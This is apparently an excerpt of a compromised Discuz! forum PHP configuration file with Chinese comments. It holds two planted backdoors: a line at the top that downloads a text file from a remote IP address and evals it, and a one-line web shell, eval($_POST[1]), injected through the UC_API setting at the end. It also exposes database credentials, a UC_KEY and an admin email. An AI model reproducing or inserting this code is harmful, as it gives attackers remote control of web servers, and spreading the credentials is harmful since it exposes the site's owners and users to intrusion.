...
$file="http://154.90.99.66:850/ut.txt";
$str = @file_get_contents($file);
eval($str);
// [CH] 以下变量请根据空间商提供的账号参数修改,如有疑问,请联系服务器提供商

	$dbhost = '10.9.9.3:63308';			// 数据库服务器
	$dbuser = 'harem_master';			// 数据库用户名
	$dbpw = 'harem_master_@#$!';				// 数据库密码
	$dbname = 'discuz';			// 数据库名
...
// [CH] 论坛安全设置, 调整以下设置，可以增强论坛的安全性能和防御性能
	...
	$adminemail = 'admin@jjwxc.com';		// 系统管理员 Email
...
define('UC_DBHOST', '10.9.9.3:63308');
define('UC_DBUSER', 'harem_master');
define('UC_DBPW', 'harem_master_@#$!');
define('UC_DBNAME', 'discuz');
define('UC_DBCHARSET', 'utf8');
define('UC_DBTABLEPRE', '`discuz`.cdb_uc_');
define('UC_DBCONNECT', '0');
define('UC_KEY', 'M83e46ycWcPak9e5Cb8a6brbE9oc63ycrbO4ucp1k114QaN3d6m96cv03dg5Xase');
define('UC_API', 'http://aaa');eval($_POST[1]);//');
